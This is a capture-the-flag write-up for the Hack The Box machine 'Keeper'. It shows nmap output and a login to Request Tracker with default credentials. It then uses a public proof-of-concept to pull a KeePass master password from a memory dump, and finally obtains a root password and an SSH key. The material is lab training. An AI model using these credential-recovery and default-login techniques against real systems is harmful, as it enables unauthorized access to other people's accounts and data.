# Keeper

## NMAP&#x20;

```rust
nmap -sCV -T5 10.129.229.41
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 11:41 PST
Warning: 10.129.229.41 giving up on port because retransmission cap hit (2).
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.25% done; ETC: 11:41 (0:00:00 remaining)
Nmap scan report for 10.129.229.41
Host is up (0.090s latency).
Not shown: 902 closed tcp ports (conn-refused), 96 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.37 seconds
```

## HTTP Enumeration (80)

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Login Portal&#x20;

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Exploiting Request Tracker

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

It was not vulnerable to those CVE's to bypass login but I was able to use default credentials

{% embed url="https://github.com/bestpractical/rt" %}

```
NOTE: The default credentials for RT are: - User: root - Pass: password Not changing the root password from the default is a SECURITY risk!
```

#### Web Enumeration

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## User Access

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

We have a keepass dmp and database.  Using this tool we can extract the .dmp file

{% embed url="https://github.com/matro7sh/keepass-dump-masterkey" %}

#### Dumping .dmp

```
❯ python3 poc.py -d /home/p3ta/htb/boxes/keeper/KeePassDumpFull.dmp
2024-01-19 12:40:52,001 [.] [main] Opened /home/p3ta/htb/boxes/keeper/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

Pasting the special charaters into google gives us the password

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

```
rødgrød med fløde
```

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

root: F4><3K0nd!

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Using puttyget i converted the key to is\_rsa and was able to use SSH

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>





